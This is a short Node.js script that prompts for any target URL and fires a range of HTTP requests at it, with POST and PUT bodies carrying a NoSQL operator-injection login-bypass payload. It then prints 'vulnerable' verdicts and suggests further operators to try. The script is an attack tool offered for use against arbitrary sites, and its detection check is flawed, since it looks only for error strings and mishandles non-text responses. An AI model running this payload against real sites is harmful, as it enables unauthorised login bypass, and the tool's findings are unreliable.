const axios = require('axios');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("Enter your target website URL: ", async (url) => {
  try {
    console.log("\nTesting for NoSQL Injection vulnerability...\n");

    // Define HTTP methods
    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD'];

    // Iterate through each method
    for (const method of methods) {
      console.log(`Sending ${method} request to ${url}...`);
      let response;

      // Send request based on method type
      switch(method) {
        case 'GET':
          response = await axios.get(url);
          break;
        case 'POST':
          response = await axios.post(url, { username: { $gt: "" }, password: { $gt: "" } });
          break;
        case 'PUT':
          response = await axios.put(url, { username: { $gt: "" }, password: { $gt: "" } });
          break;
        case 'DELETE':
          response = await axios.delete(url);
          break;
        case 'OPTIONS':
          response = await axios.options(url);
          break;
        case 'HEAD':
          response = await axios.head(url);
          break;
        default:
          console.log(`Invalid method: ${method}`);
      }

      // Check for vulnerability
      if (response && (response.data.includes("Error") || response.data.includes("MongoError"))) {
        console.log("\x1b[31m", `The target website is vulnerable to NoSQL Injection with ${method} method!`);
        console.log("\x1b[0m", "\nHow to test this vulnerability:\n");
        console.log("Try modifying the payload with different operators such as $gt (greater than), $ne (not equal), etc. and observe the response.");
      } else {
        console.log("\x1b[32m", `The target website is not vulnerable to NoSQL Injection with ${method} method.`);
      }
    }
  } catch (error) {
    console.error("An error occurred:", error.message);
  } finally {
    rl.close();
  }
});
